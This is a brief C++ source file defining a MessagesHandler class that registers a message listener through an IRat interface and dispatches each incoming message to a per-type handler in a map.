#include "MessagesHandler.h"

#include <utility>

MessagesHandler::MessagesHandler(
	IRat* rat,
	IConnection* connection,
	std::map<MessageType, std::unique_ptr<IMessageHandler>>* map
) :
_listener(
	rat->CreateMessageListener(
		connection, 
		[this](auto type, auto message) { OnMessage(type, message); })),
_map(map)
{
}

void MessagesHandler::OnMessage(const MessageType type, std::string message) const
{
	(* _map)[type]->Handle(std::move(message));
}
